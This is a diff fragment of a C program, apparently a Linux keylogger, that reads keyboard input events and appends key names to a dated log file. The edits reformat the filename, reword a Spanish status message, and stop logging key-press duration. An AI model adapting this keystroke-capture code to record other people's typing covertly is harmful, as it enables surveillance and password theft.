@@ -9,7 +9,7 @@
 char* get_log_filename() {
     static char filename[128];
     time_t t = time(NULL);
-    strftime(filename, sizeof(filename), "/home/apollo/Documents/keylogger/%d-%m-%Y_%H-%M.txt", localtime(&t));
+    strftime(filename, sizeof(filename), "/home/apollo/Documents/keylogger/%d-%m-%H-%M.txt", localtime(&t));
     return filename;
 }
 
@@ -75,14 +75,14 @@ int main() {
     struct timeval press_time;
     int shift_pressed = 0;
 
-    printf("Escuchando eventos en %s y registrando en %s\n", device_path, log_file);
+    printf("Escuchando eventos del teclado en %s y guardandolo en %s\n", device_path, log_file);
 
     while (1) {
         if (read(device, &ev, sizeof(ev)) > 0 && ev.type == EV_KEY) {
-            if (ev.value == 1) {  // Tecla presionada
+            if (ev.value == 1) { 
                 gettimeofday(&press_time, NULL);
                 shift_pressed = (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT);
-            } else if (ev.value == 0) {  // Tecla soltada
+            } else if (ev.value == 0) {  
                 struct timeval release_time;
                 gettimeofday(&release_time, NULL);
                 long duration = (release_time.tv_sec - press_time.tv_sec) * 1000 +
@@ -90,7 +90,7 @@ int main() {
 
                 FILE *log_fp = fopen(log_file, "a");
                 if (log_fp) {
-                    fprintf(log_fp, "Tecla: %s, Duración: %ld ms\n",
+                    fprintf(log_fp, "Tecla: %s\n",
                             keycode_to_string(ev.code, shift_pressed), duration);
                     fclose(log_fp);
                 } else {
